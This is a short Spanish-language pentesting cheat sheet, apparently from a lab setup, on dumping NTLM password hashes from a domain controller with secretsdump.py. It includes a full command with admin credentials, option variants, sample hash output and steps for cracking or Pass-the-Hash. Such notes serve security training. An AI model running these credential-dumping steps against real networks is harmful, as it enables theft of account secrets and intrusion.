

```bash
secretsdump.py marvel.local/Administrador:Password123!@192.168.0.10
```



# 🛠️ Variantes útiles:

|Opción|Uso|
|---|---|
|`-just-dc`|Solo extrae los hashes del DC (más rápido).|
|`-just-dc-user user`|Solo extrae el hash de un usuario específico.|
|`-hashes LM:NT`|Si tienes el hash en vez de la contraseña, puedes autenticarte usando el hash.|


# 🎯 ¿Qué obtienes?

- **Nombre de usuario**.
    
- **RID** (Identificador relativo).
    
- **Hash LM** (casi siempre vacío hoy en día).
    
- **Hash NTLM** (el que te interesa para Pass-the-Hash o crackeo).
    

**Salida típica:**

ruby

CopiarEditar

`Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::`

Luego puedes meter esos hashes en **hashcat** o **john** para crackearlos.

---

# 📌 Resumen súper rápido:

|Paso|Acción|
|---|---|
|1|Acceso administrador al DC|
|2|Ejecutar `secretsdump.py` contra el DC|
|3|Conseguir hashes NTLM|
|4|Crackear o usar para Pass-the-Hash|